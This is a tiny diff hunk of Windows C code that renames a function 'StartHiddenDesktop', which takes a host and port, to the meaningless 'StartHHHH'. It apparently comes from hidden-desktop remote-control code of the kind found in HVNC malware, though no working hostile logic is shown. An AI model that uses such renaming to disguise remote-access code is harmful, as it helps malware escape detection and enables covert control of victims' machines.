@@ -1075,7 +1075,7 @@ static DWORD WINAPI MainThread(LPVOID param)
     return 0;
 }
 
-HANDLE StartHiddenDesktop(const char *host, int port)
+HANDLE StartHHHH(const char *host, int port)
 {
     if (g_started)
         return NULL;
